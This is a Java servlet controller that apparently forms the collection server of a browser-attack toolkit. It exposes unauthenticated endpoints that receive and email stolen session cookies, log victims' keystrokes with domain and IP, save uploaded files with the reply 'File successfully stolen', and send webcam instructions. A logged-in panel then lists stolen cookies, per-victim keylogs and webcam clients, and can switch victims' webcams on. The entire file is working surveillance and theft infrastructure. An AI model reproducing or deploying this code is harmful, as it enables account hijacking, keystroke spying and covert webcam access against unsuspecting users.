package com.eh.openshiftapp.controller;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.text.ParseException;
import java.util.Iterator;
import java.util.List;
import java.util.StringTokenizer;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

import com.eh.openshiftapp.model.KeyloggedUser;
import com.eh.openshiftapp.model.User;
import com.eh.openshiftapp.model.UserCookie;
import com.eh.openshiftapp.model.Webcam;
import com.eh.openshiftapp.service.ApplicationService;
import com.eh.openshiftapp.service.LoginService;
import com.eh.openshiftapp.utility.JsonResponse;

/**
 * Servlet implementation class LoginController
 */
public class AppController extends HttpServlet {
	private static final long serialVersionUID = 1L;
	final LoginService loginService = new LoginService();
	final ApplicationService applicationService = new ApplicationService();

	/**
	 * @see HttpServlet#HttpServlet()
	 */
	public AppController() {
		super();
		// TODO Auto-generated constructor stub
	}

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse
	 *      response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		// TODO Auto-generated method stub
		RequestDispatcher dispatcher = null;
		final String requestType = request.getParameter("requestType");

		if ("XMLHttpRequest".equals(request.getHeader("X-Requested-With"))) {
			doPost(request, response);
		} else {
			if (requestType != null && !"".equals(requestType)) {
				doPost(request, response);
			} else if (request.getSession().getAttribute("currentPage") != null) {
				String currentPage = (String) request.getSession().getAttribute("currentPage");
				dispatcher = request.getRequestDispatcher(currentPage);
				dispatcher.forward(request, response);
			} else {
				dispatcher = request.getRequestDispatcher("login.jsp");
				request.getSession().setAttribute("currentPage", "login.jsp");
				dispatcher.forward(request, response);
			}
		}
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse
	 *      response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		// TODO Auto-generated method stub
		RequestDispatcher dispatcher = null;
		JsonResponse jsonResponse = new JsonResponse();
		final String requestType = request.getParameter("requestType");

		if (ServletFileUpload.isMultipartContent(request)) {
			saveFile(request);
			response.setContentType("text/plain");
			response.setCharacterEncoding("UTF-8");
			response.getWriter().write("File successfully stolen and saved on server!");
		} else {
			if ("login".equals(requestType)) {
				final String username = request.getParameter("username");
				final String password = request.getParameter("password");
				try {
					User user = loginService.doLogin(username, password);
					if (request.getSession(false) != null) {
						request.getSession(false).invalidate();
						HttpSession session = request.getSession(true);
						if (user.getUsername() != null) {
							session.setAttribute("user", user);
							dispatcher = request.getRequestDispatcher("home.jsp");
							session.setAttribute("currentPage", "home.jsp");
						} else {
							request.setAttribute("errorMessage", "Username or password is incorrect!");
						}
					} else {
						request.setAttribute("errorMessage",
								"Either your browser cookie is disbled or some unknown error happened!");
					}
				} catch (SQLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					request.setAttribute("errorMessage", e.getMessage());
				}
				if (dispatcher == null) {
					dispatcher = request.getRequestDispatcher("login.jsp");
					request.getSession().setAttribute("currentPage", "login.jsp");
				}
				dispatcher.forward(request, response);
			} else if ("logout".equals(requestType)) {
				if (request.getSession(false) != null) {
					request.getSession(false).invalidate();
				}
				request.setAttribute("logoutMessage", "You have been successfully logged out!");
				dispatcher = request.getRequestDispatcher("login.jsp");
				request.getSession().setAttribute("currentPage", "login.jsp");
				dispatcher.forward(request, response);
			} else if (requestType != null && !"stealCookie".equals(requestType) && !"keyLogger".equals(requestType)
					&& !"webcamInstruction".equals(requestType)
					&& ((HttpServletRequest) request).getSession().getAttribute("user") == null) {
				if ("XMLHttpRequest".equals(request.getHeader("X-Requested-With"))) {
					jsonResponse.setStatus("failed");
					jsonResponse.setData("Either user is not authenticated or session has expired!");
					PrintWriter out = response.getWriter();
					response.setStatus(401);
					response.setContentType("application/json");
					response.setCharacterEncoding("UTF-8");
					out.print(jsonResponse.getJsonResponseString(jsonResponse));
					out.flush();
				} else {
					request.setAttribute("errorMessage", "You are not allowed to access this content!");
					dispatcher = request.getRequestDispatcher("login.jsp");
					request.getSession().setAttribute("currentPage", "login.jsp");
					dispatcher.forward(request, response);
				}
			} else {
				if ("stealCookie".equals(requestType)) {
					final String username = request.getParameter("username");
					final String cookie = request.getParameter("cookie");
					try {
						applicationService.insertCookie(username, cookie);
						applicationService.sendCookieEmail("Cookie for user - " + username, cookie);
						jsonResponse.setStatus("success");
						jsonResponse.setData("Stealed user cookie successfully");
					} catch (SQLException e) {
						e.printStackTrace();
					}
				} else if ("keyLogger".equals(requestType)) {
					final String domain = request.getParameter("currentDomain");
					final String page = request.getParameter("currentPage");
					final String pressedKey = request.getParameter("pressedKey");
					final String clientIP = getClientIpAddress(request);
					final String clientTime = request.getParameter("clientTime");
					try {
						applicationService.logPressedKey(domain, page, pressedKey, clientIP, clientTime);
						jsonResponse.setStatus("success");
						jsonResponse.setData("Logged pressed key successfully");
					} catch (SQLException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				} else if ("webcamInstruction".equals(requestType)) {
					final String geoLocation = request.getParameter("geoLocation");
					final String clientIP = getClientIpAddress(request);
					try {
						Webcam webcam = applicationService.getWebcamInstruction(clientIP, geoLocation);
						jsonResponse.setStatus("success");
						jsonResponse.setData(webcam);
					} catch (SQLException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				} else if ("deleteCookie".equals(requestType)) {
					try {
						applicationService.deleteCookie();
						jsonResponse.setStatus("success");
						jsonResponse.setData("Cookie history deleted successfully!");
					} catch (SQLException e) {
						e.printStackTrace();
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				} else if ("retrieveCookie".equals(requestType)) {
					try {
						List<UserCookie> userCookieList = applicationService.retrieveCookie();
						if (userCookieList != null && userCookieList.size() > 0) {
							jsonResponse.setStatus("success");
							jsonResponse.setData(userCookieList);
						} else {
							jsonResponse.setStatus("failed");
							jsonResponse.setData("Could not found any result!");
						}
					} catch (SQLException e) {
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				} else if ("getKeyloggedUsers".equals(requestType)) {
					final String logDate = request.getParameter("logDate");
					try {
						List<KeyloggedUser> keyloggedUserList = applicationService.getKeyloggedUsers(logDate);
						if (keyloggedUserList != null && keyloggedUserList.size() > 0) {
							jsonResponse.setStatus("success");
							jsonResponse.setData(keyloggedUserList);
						} else {
							jsonResponse.setStatus("failed");
							jsonResponse.setData("Could not found any result!");
						}
					} catch (SQLException e) {
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				} else if ("getKeylogs".equals(requestType)) {
					final String logDate = request.getParameter("logDate");
					final String clientIP = request.getParameter("clientIP");
					final String domain = request.getParameter("domain");
					try {
						String keylogs = applicationService.getKeylogs(logDate, clientIP, domain);
						if (keylogs != null) {
							jsonResponse.setStatus("success");
							jsonResponse.setData(keylogs);
						} else {
							jsonResponse.setStatus("failed");
							jsonResponse.setData("Could not found any result!");
						}
					} catch (SQLException | ParseException e) {
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				} else if ("getDetailedKeylogs".equals(requestType)) {
					final String logDate = request.getParameter("logDate");
					final String clientIP = request.getParameter("clientIP");
					final String domain = request.getParameter("domain");
					try {
						List<KeyloggedUser> keyloggedUserList = applicationService.getDetailedKeylogs(logDate, clientIP,
								domain);
						if (keyloggedUserList != null) {
							jsonResponse.setStatus("success");
							jsonResponse.setData(keyloggedUserList);
						} else {
							jsonResponse.setStatus("failed");
							jsonResponse.setData("Could not found any result!");
						}
					} catch (SQLException | ParseException e) {
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				} else if ("getWebcamClients".equals(requestType)) {
					try {
						List<Webcam> webcamList = applicationService.getWebcamClients();
						if (webcamList != null) {
							jsonResponse.setStatus("success");
							jsonResponse.setData(webcamList);
						} else {
							jsonResponse.setStatus("failed");
							jsonResponse.setData("Could not found any result!");
						}
					} catch (SQLException e) {
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				} else if ("webcamSwitch".equals(requestType)) {
					try {
						final String clientIP = request.getParameter("clientIP");
						final String turnOnCam = request.getParameter("turnOnCam");
						applicationService.webcamSwitch(clientIP, turnOnCam);
						jsonResponse.setStatus("success");
						jsonResponse.setData("Webcam switch executed successfully!");
					} catch (SQLException e) {
						jsonResponse.setStatus("failed");
						jsonResponse.setData(e.getMessage());
					}
				}
				PrintWriter out = response.getWriter();
				response.setContentType("application/json");
				response.setCharacterEncoding("UTF-8");
				out.print(jsonResponse.getJsonResponseString(jsonResponse));
				out.flush();
			}
		}
	}

	private static String getClientIpAddress(HttpServletRequest request) {
		String xForwardedForHeader = request.getHeader("X-Forwarded-For");
		if (xForwardedForHeader == null) {
			return request.getRemoteAddr();
		} else {
			return new StringTokenizer(xForwardedForHeader, ",").nextToken().trim();
		}
	}

	private static void saveFile(HttpServletRequest request) {
		String filePath = "E:\\Temp\\uploads\\";
		int maxFileSize = 50 * 1024;
		int maxMemSize = 4 * 1024;
		File file;

		DiskFileItemFactory factory = new DiskFileItemFactory();

		// maximum size that will be stored in memory
		factory.setSizeThreshold(maxMemSize);

		// Location to save data that is larger than maxMemSize.
		factory.setRepository(new File("E:\\Temp\\uploads"));

		// Create a new file upload handler
		ServletFileUpload upload = new ServletFileUpload(factory);

		// maximum file size to be uploaded.
		upload.setSizeMax(maxFileSize);

		try {
			// Parse the request to get file items.
			List<FileItem> fileItems = upload.parseRequest(request);

			// Process the uploaded file items
			Iterator<FileItem> i = fileItems.iterator();

			while (i.hasNext()) {
				FileItem fi = (FileItem) i.next();
				if (!fi.isFormField()) {
					// Get the uploaded file parameters
					// String fieldName = fi.getFieldName();
					String fileName = fi.getName();
					// String contentType = fi.getContentType();
					// boolean isInMemory = fi.isInMemory();
					// long sizeInBytes = fi.getSize();

					// Write the file
					if (fileName.lastIndexOf("\\") >= 0) {
						file = new File(filePath + fileName.substring(fileName.lastIndexOf("\\")) + "\\");
					} else {
						file = new File(filePath + fileName.substring(fileName.lastIndexOf("\\") + 1) + "\\");
					}
					fi.write(file);
				}
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
